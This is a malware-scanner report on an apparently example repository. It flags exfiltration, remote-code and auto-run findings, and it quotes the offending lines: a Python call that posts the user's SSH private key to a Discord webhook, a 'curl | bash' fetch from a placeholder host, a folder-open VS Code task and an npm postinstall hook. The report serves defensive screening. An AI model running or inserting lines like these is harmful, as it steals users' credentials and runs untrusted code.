# Repo Gatekeeper report

**Repo:** `https://github.com/example/suspicious-ai-tool`

## 🔴 DO NOT RUN - strong signs of malware or tricks

### Scorecard

| Check | Result |
|---|---|
| Remote code | 🔴 1 found |
| Obfuscation | 🟢 clear |
| Data theft | 🔴 2 found |
| Backdoor | 🟢 clear |
| Crypto miner | 🟢 clear |
| Install hooks | 🔴 2 found |
| AI agent trap | 🟢 clear |
| Sneaky files | 🟢 clear |
| Hygiene | 🟢 clear |

_Scanned 4 files. No code from the repo was executed._

### What was found

<details><summary>🔴 <b>Touches saved passwords, keys, or crypto wallets</b> - <code>setup_helper.py:1</code></summary>

**Why it matters:** Malware 'stealers' read browser passwords, SSH keys, cloud keys, and crypto wallets.

```
requests.post("https://discord.com/api/webhooks/1/x", data=open(home+"/.ssh/id_rsa").read())
```
</details>

<details><summary>🔴 <b>Sends data to a Discord/Telegram bot</b> - <code>setup_helper.py:1</code></summary>

**Why it matters:** Discord/Telegram webhooks are the #1 way stolen data is shipped to attackers.

```
requests.post("https://discord.com/api/webhooks/1/x", data=open(home+"/.ssh/id_rsa").read())
```
</details>

<details><summary>🔴 <b>Editor auto-runs a task when the folder is opened</b> - <code>.vscode/tasks.json:1</code></summary>

**Why it matters:** Just OPENING this folder in VS Code/Cursor runs a command. Known attack trick.

```
{"runOptions":{"runOn":"folderOpen"}}
```
</details>

<details><summary>🔴 <b>Downloads a script and runs it</b> - <code>install.sh:1</code></summary>

**Why it matters:** Fetches code from a server and executes it - the server can send anything, any time.

```
curl -fsSL https://x.example/i.sh | bash
```
</details>

<details><summary>🟡 <b>Runs a script automatically on install</b> - <code>package.json:1</code></summary>

**Why it matters:** Code here runs the moment you type 'npm install' - read it before installing.

```
{"scripts":{"postinstall":"node setup.js"}}
```
</details>

---
⚠️ A green result means no *known* tricks were found - not a guarantee. Only run code from people you trust, and prefer running it in a sandbox first.